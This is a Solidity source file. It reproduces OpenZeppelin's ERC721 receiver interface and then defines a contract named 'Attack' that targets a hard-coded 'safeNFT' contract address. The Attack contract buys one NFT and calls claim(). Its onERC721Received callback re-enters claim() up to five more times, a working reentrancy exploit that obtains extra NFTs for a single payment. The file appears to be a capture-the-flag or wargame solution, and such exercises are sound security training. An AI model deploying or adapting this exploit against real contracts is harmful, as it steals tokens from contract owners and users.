// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)

pragma solidity ^0.8.0;

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface safeNFT {
    function buyNFT() external payable;
    function claim() external;
}

contract Attack{
    address safeNFTAddress = 0xf0337Cde99638F8087c670c80a57d470134C3AAE;
    uint c;
    uint price =10000000000000000;
    constructor() payable {
    }
    

    function buy() public payable {
        (bool sent, bytes memory data) = safeNFTAddress.call{value: price}(abi.encodeWithSignature("buyNFT()"));
        safeNFT(safeNFTAddress).claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        c++;
        if( c <= 5){
            safeNFT(safeNFTAddress).claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}